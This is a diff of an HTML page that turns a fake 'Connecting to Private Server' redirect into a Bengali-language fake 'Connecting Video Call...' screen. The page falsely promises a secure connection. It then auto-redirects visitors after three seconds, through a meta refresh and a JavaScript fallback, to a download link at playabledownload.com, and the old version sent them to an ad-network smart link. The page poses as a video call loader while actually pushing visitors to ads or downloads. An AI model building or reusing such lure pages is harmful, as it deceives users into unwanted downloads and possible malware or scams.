@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting... Please Wait</title>
+    <title>Video Call Loading...</title>
     
-    <!-- Meta Refresh: Fallback 2-second redirect -->
-    <meta http-equiv="refresh" content="2;url=https://www.effectivecpmnetwork.com/dwbdwaz1g?key=9a0b4ea321dd21db57527a1c9360660a">
-    
+    <!-- ৩ সেকেন্ড পর অটো রিডাইরেক্টের জন্য Meta Tag -->
+    <meta http-equiv="refresh" content="3;url=https://playabledownload.com/1906906">
+
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
@@ -22,40 +22,45 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
             text-align: center;
-        }
-
-        .card {
-            background: #1e293b;
-            padding: 35px 25px;
+            padding: 20px;
             border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-            max-width: 400px;
-            width: 100%;
-            border: 1px solid #334155;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 350px;
+            width: 90%;
         }
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #334155;
-            border-top: 5px solid #38bdf8;
+        .video-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #2563eb;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(37, 99, 235, 0.6);
+            animation: pulse 1.5s infinite;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .video-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: #ffffff;
         }
 
         h2 {
             font-size: 20px;
             margin-bottom: 10px;
-            color: #f8fafc;
+            font-weight: 600;
         }
 
         p {
@@ -64,52 +69,51 @@
             margin-bottom: 20px;
         }
 
-        .btn {
-            display: inline-block;
-            width: 100%;
-            padding: 12px;
-            background-color: #2563eb;
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-            border-radius: 8px;
-            transition: background 0.2s ease;
+        /* স্পিনার এনিমেশন */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
-        .btn:hover {
-            background-color: #1d4ed8;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(37, 99, 235, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
+    <div class="container">
+        <!-- ভিডিও কল আইকন -->
+        <div class="video-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+            </svg>
+        </div>
+
+        <h2>Connecting Video Call...</h2>
+        <p>Please wait while we establish a secure connection.</p>
+
+        <!-- লোডিং স্পিনার -->
         <div class="spinner"></div>
-        <h2>Connecting to Private Server...</h2>
-        <p>You will be redirected in <span id="timer" style="color: #38bdf8; font-weight: bold;">2</span> seconds.</p>
-        
-        <!-- Manual fallback button -->
-        <a href="https://www.effectivecpmnetwork.com/dwbdwaz1g?key=9a0b4ea321dd21db57527a1c9360660a" class="btn" id="redirect-link">Click Here If Not Redirected</a>
     </div>
 
+    <!-- JavaScript Fallback (যদি কোনো ব্রাউজারে Meta Tag কাজ না করে) -->
     <script>
-        // Target Destination Smart Link
-        const targetURL = "https://www.effectivecpmnetwork.com/dwbdwaz1g?key=9a0b4ea321dd21db57527a1c9360660a";
-        
-        let seconds = 2;
-        const timerElement = document.getElementById('timer');
-        
-        // Countdown Timer Logic
-        const countdown = setInterval(() => {
-            seconds--;
-            if (seconds >= 0) {
-                timerElement.textContent = seconds;
-            }
-            if (seconds <= 0) {
-                clearInterval(countdown);
-                window.location.href = targetURL;
-            }
-        }, 1000);
+        setTimeout(function() {
+            window.location.href = "https://playabledownload.com/1906906";
+        }, 3000);
     </script>
 
 </body>
